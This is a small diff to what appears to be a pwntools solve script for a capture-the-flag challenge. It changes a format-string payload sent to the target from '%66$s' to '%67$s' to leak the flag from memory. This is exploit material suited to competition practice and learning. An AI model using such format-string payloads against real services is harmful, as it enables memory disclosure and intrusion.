@@ -41,7 +41,7 @@ def main():
     r.sendline(b"./flag")
     sleep(0.5)
     r.recvuntil(b"Now where we?", timeout=2)
-    r.sendline(b"%66$s")
+    r.sendline(b"%67$s")
     sleep(0.5)
     output = r.recvline(timeout=2)
     log.success(f"FLAG: {output.strip().decode(errors='replace')}")
